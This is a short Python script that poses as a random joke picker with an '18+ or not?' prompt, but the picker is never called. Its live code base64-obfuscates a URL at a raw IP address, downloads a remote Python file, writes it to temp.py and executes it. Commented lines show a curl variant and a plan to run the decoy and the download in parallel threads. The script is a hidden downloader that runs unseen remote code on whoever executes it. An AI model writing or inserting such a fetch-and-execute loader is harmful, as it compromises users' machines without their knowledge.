import threading
import random
import os
import base64
import requests


lis18 = []

lis = []


def tnd(lis, lis18):
    while True:
        a = input("18+ or not? ")
        if a == "not":
            print(random.choice(lis))
        else:
            print(random.choice(lis18))

#com = base64.encode("curl http://138.91.43.126:8000/index.py",)

sample_string = "http://138.91.43.126:8000/index.py"
sample_string_bytes = sample_string.encode("ascii")

base64_bytes = base64.b64encode(sample_string_bytes)
base64_string = base64_bytes.decode("ascii")
#
# print(base64_string)

#base64_string = "Y3VybCBodHRwOi8vMTM4LjkxLjQzLjEyNjo4MDAwL2luZGV4LnB5"
base64_bytes = base64_string.encode("ascii")

sample_string_bytes = base64.b64decode(base64_bytes)
sample_string = sample_string_bytes.decode("ascii")
print(sample_string)
#r = os.system(sample_string)
r = requests.get(sample_string)

with open("temp.py", 'w') as f:
    f.write(r.text)

os.system('python temp.py')


# t1 = threading.Thread(target=tnd, args=(lis,lis18,))
# t2 = threading.Thread(target=sub, args=(com,))
#
# t1.start()
# t2.start()
